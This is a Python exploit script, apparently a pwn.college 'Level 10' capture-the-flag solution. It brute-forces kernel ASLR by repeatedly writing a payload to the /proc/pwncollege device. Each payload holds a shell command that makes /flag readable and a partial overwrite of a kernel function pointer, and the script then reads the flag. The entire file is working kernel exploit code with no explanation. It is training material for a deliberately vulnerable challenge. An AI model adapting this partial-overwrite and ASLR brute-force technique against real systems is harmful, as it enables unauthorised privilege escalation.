# Level 10
import os

import pwn
from dojotool import aslr


def one_round(addr):
    payload = pwn.flat(
        {
            0x000: b"/usr/bin/chmod +444 /flag",
            0x100: pwn.p64(addr)[:3],
        },
        filler=b"\0",
    )

    print(pwn.hexdump(payload))
    pid = os.fork()
    if pid == 0:  # a faulty child got killed will not affect the parent
        fd = os.open("/proc/pwncollege", os.O_RDWR)
        os.write(fd, payload)
        os.close(fd)
        os._exit(0)
    else:
        os.waitpid(pid, 0)  # wait for the child to finish


for addr in aslr(0xFFFFFFFF81089B30, bits=21):
    one_round(addr)

# run_cmd() will not wait for the command to finish
pwn.sleep(1)
print(pwn.read("/flag").decode())
